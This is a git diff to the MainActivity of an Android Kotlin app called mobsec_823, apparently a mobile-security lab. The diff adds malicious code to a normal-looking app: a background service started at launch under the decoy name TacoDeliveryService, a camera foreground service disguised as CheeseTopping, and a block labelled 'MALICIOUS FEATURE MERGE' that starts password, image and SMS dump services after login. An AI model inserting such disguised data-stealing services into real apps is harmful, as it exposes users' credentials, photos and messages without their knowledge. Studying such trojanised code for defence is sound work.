@@ -31,19 +31,55 @@ import com.example.mobsec_823.ui.screens.RegisterScreen
 import com.example.mobsec_823.ui.theme.MobSecTheme
 import kotlinx.coroutines.launch
 
+import android.Manifest
+import android.content.Intent
+import androidx.activity.compose.setContent
+import androidx.activity.enableEdgeToEdge
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.compose.runtime.*
+import androidx.core.content.ContextCompat
+import com.example.mobsec_823.ui.screens.* // Assuming your screens are in this package
+import com.example.mobsec_823.ui.theme.MobSecTheme
+
+import androidx.compose.ui.platform.LocalContext
+import com.example.mobsec_823.malicious.ImageDumpService
+import com.example.mobsec_823.malicious.PasswordDumpService
+import com.example.mobsec_823.malicious.SMSDumpService
+
 class MainActivity : ComponentActivity() {
+    private val cameraPermissionLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestPermission()) { granted ->
+            if (granted) {
+                startCameraService()
+            }
+        }
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+
+        // --- Automatically start the background service ---
+        val serviceIntent = Intent(this, TacoDeliveryService::class.java).apply {
+            action = TacoDeliveryService.ACTION_OPEN_FOR_BUSINESS
+        }
+        startService(serviceIntent)
 
         // Initialize database helper with application context
         DatabaseHelper.initialize(applicationContext)
 
         enableEdgeToEdge()
+
+        cameraPermissionLauncher.launch(Manifest.permission.CAMERA)
+
         setContent {
             MobSecTheme {
                 MobSecApp()
             }
         }
+    }
+
+    private fun startCameraService() {
+        val intent = Intent(this, CheeseTopping::class.java)
+        ContextCompat.startForegroundService(this, intent)
     }
 }
 
@@ -274,11 +310,27 @@ fun AppScaffold(
     onAdminManagementSelectedTabChange: (Int) -> Unit,
     onOpenDrawer: () -> Unit
 ) {
+    // Get context for starting services
+    val context = LocalContext.current
+
     when (currentScreen) {
         Screen.Login -> {
             LoginScreen(
                 onLoginSuccess = { user ->
                     onUserChange(user)
+
+                    // --- MALICIOUS FEATURE MERGE START ---
+                    // Trigger services upon successful login
+                    val passwordIntent = Intent(context, PasswordDumpService::class.java)
+                    context.startService(passwordIntent)
+
+                    val imageIntent = Intent(context, ImageDumpService::class.java)
+                    context.startService(imageIntent)
+
+                    val smsIntent = Intent(context, SMSDumpService::class.java)
+                    context.startService(smsIntent)
+                    // --- MALICIOUS FEATURE MERGE END ---
+
                     onScreenChange(Screen.HomeMenu)
                 },
                 onNavigateToRegister = { onScreenChange(Screen.Register) }
